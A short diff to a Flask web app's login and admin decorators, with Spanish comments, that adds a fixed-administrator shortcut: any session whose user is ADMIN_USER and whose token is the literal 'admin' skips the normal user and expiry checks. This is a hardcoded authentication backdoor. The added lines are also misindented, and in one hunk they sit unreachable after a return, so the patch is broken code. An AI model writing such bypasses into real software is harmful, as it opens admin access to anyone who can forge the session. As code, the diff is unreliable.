@@ -307,6 +307,9 @@ def login_required(f):
     def decorated(*args, **kwargs):
         if "user" not in session or "token" not in session:
             return jsonify({"error": "unauthorized"}), 401
+            # Permitir acceso al administrador
+if session.get("user") == ADMIN_USER and session.get("token") == "admin":
+    return f(*args, **kwargs)
         user = User.query.filter_by(email=session["user"]).first()
         if not user or user.expires < datetime.utcnow().date():
             session.clear()
@@ -322,7 +325,11 @@ def admin_required(f):
     def decorated(*args, **kwargs):
         if "user" not in session:
             return redirect(url_for("login"))
-        user = User.query.filter_by(email=session["user"]).first()
+        # Permitir administrador fijo
+if session.get("user") == ADMIN_USER and session.get("token") == "admin":
+    return f(*args, **kwargs)
+
+user = User.query.filter_by(email=session["user"]).first()
         if not user or not user.is_admin:
             return redirect(url_for("panel"))
         return f(*args, **kwargs)
